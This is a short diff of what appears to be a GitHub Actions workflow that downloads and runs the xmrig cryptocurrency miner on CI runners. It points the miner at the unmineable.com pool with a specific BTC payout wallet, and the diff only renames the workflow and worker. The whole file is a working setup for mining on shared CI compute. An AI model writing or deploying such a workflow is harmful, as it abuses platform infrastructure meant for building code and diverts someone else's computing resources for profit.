@@ -1,4 +1,4 @@
-name: Unmineable BTC Miner
+name: Unmineable BTC Miner 1
 
 on:
   workflow_dispatch:
@@ -25,5 +25,5 @@ jobs:
           cd xmrig-6.24.0
           chmod +x xmrig
           ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 \
-            -u BTC:bc1ql83n6aql33keyqygsggq5zaczuefmlyrpv9h49.unmineable_miner_ghaction#xg8f-8asc \
+            -u BTC:bc1ql83n6aql33keyqygsggq5zaczuefmlyrpv9h49.unmineable_miner_ghaction1#xg8f-8asc \
             -p x -k --no-color
